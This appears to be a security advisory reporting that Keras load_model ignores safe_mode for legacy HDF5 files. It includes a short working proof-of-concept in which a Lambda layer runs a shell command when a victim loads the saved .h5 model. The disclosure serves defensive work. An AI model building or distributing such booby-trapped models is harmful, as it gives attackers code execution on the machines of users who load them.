## Summary

When a model in the legacy format HDF5 (`.h5` or `.hdf5`) is loaded using the Keras `Model.load_model` method, the `safe_mode` setting is **silently** ignored without any warning or error. This allows an attacker to execute arbitrary code on the victim’s machine with the same privileges as the Keras application, even when `safe_mode` is enabled. The attack works regardless of the other parameters passed to `load_model` and does not require any sophisticated technique—the hardening on the content of `Lambda` layers is just not checked when HDF5 files are loaded.


## Details
According to the official Keras documentation, `safe_mode` is defined as:

```
safe_mode: Boolean, whether to disallow unsafe lambda deserialization. When safe_mode=False, loading an object has the potential to trigger arbitrary code execution. This argument is only applicable to the Keras v3 model format. Defaults to True.
```
As described, the `safe_mode` option applies only to `.keras` (v3) models. In practice, this means there is no intended ways to restrict the content of `Lambda` layers in models stored in the HDF5 format, which can therefore contain arbitrary serialized code.

However, HDF5 files can still be loaded seamlessly using `load_model` with `safe_mode=True`, **without** any warning or error, even though the hardening provided by safe mode cannot be applied to this file format. Whether this implementation choice was intentional or not, silently ignoring a security-related parameter is misleading for users who are unaware of the internal Keras behavior, creating a **false sense of security** due to `safe_mode`. At a minimum, if `safe_mode` cannot be enforced for a given file format, an explicit error should be raised to alert the user.

This issue is particularly critical given the widespread use of the HDF5 format, despite the introduction of newer formats.

Examining the implementation of `load_model` in `keras/src/saving/saving_api.py`, we can see that the `safe_mode` parameter is completely ignored when loading HDF5 files. Here's the relevant snippet:

```python
def load_model(filepath, custom_objects=None, compile=True, safe_mode=True):
    is_keras_zip = ...
    is_keras_dir = ...
    is_hf = ...

    # Support for remote zip files
    if (
        file_utils.is_remote_path(filepath)
        and not file_utils.isdir(filepath)
        and not is_keras_zip
        and not is_hf
    ):
        ...

    if is_keras_zip or is_keras_dir or is_hf:
        ...

    if str(filepath).endswith((".h5", ".hdf5")):
        return legacy_h5_format.load_model_from_hdf5(
            filepath, custom_objects=custom_objects, compile=compile
        )
```

As shown, when the file extension is `.h5` or `.hdf5`, the method delegates to `legacy_h5_format.load_model_from_hdf5`, which does not use or check the `safe_mode` parameter at all.

## Exploit

From the attacker’s perspective, creating a malicious HDF5 model which rely on `Lambda` layers to perform arbitrary code execution is as simple as the following:

```python
import keras

f = lambda x: (
    exec("import os; os.system('sh')"),
    x,
)

model = keras.Sequential()
model.add(keras.layers.Input(shape=(1,)))
model.add(keras.layers.Lambda(f))
model.compile()

keras.saving.save_model(model, "./provola.h5")
```

From the victim’s side, triggering code execution is just as simple:

```python
import keras

model = keras.models.load_model("./provola.h5", safe_mode=True)
```

That’s all. The exploit occurs **during model loading**, with no further interaction required. The parameters passed to the method do not mitigate of influence the attack in any way.


As expected, the attacker can substitute the `exec(...)` call with any payload. Whatever command is used will execute with the same permissions as the Keras application.

### Proof of Concept (PoC)
The complete PoC is available.

The folder contains:
* `generate.py` – generates a malicious `HDF5` file (`poc.h5`)
* `poc_load.py` – demonstrates arbitrary code execution during model loading


## Attack scenario

The attacker may distribute a malicious `.h5`/`.hdf5` model on platforms such as Hugging Face or through other channels. The victim only needs to load the model—*even with* `safe_mode=True` that would give the illusion of security. No inference or further action is required, making the threat particularly stealthy and dangerous.

Once the model is loaded, the attacker gains the ability to execute arbitrary code on the victim’s machine with the same privileges as the Keras process. The provided proof-of-concept demonstrates a simple shell spawn, but any payload could be delivered this way.